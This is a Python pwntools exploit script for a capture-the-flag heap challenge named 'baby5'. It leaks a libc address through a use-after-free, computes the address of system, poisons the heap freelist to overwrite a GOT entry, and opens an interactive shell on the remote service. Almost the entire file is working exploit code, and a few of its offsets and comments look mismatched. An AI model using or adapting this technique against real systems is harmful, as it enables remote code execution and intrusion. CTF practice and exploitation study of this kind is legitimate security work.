from pwn import *

p = remote("baby-01.pwn.beer", 10005)
#p = process("./baby5", env={"LD_PRELOAD":"./libc.so.6"})

elf_libc = ELF("./libc.so.6")

#gdb.attach(p, '''
#    b *0x400740
#''')

def add(size, data):
    p.sendlineafter(">", "1")
    p.sendlineafter("size:", str(size))
    p.sendlineafter("data:", data)

def show(idx):
    p.sendlineafter(">", "4")
    p.sendlineafter("item:", str(idx))
    p.recvuntil("data: ")
    return p.recvline()

def delete(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter("item:", str(idx))

def edit(idx, size, data):
    p.sendlineafter(">", "2")
    p.sendlineafter("item:", str(idx))
    p.sendlineafter("size:", str(size))
    p.sendlineafter("data:", data)

add(0x1000, "")
add(0x10, "/bin/sh\x00") # 1

delete(0)
libc_leak = u64(show(0)[:-1].ljust(8,"\x00"))
print hex(libc_leak)

libc = libc_leak - 0x3ebca0
print "base", hex(libc)

free_hook = libc + 0x28e8

system = libc + 0x4f440

print hex(system)

add(16, "")
delete(0)
edit(0, 16, p64(0x602020+8)) # overwrite puts.got with system
add(16, "")


#add(32, "A"*2 + p64(system) + "C"*4) # victim
add(16, p64(system)) # victim

#p.sendline("4")
#p.sendline("1")
#p.sendline("/bin/sh")


p.interactive()
